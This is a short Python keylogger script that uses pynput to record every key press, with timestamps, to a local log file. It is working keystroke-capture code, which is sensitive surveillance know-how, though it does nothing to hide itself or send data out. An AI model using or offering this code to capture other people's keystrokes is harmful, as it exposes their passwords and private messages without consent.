from pynput import keyboard
from datetime import datetime

file = r"D:\coding\python\Key Logger\Log File.txt"

def write(key):
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(file, "a") as f:
        try:
            f.write(f"{time} - {key.char}\n")
        except AttributeError:
            f.write(f"{time} - [{key}]\n")

def on_press(key):
    write(key)

with keyboard.Listener(on_press=on_press) as ls:
    ls.join()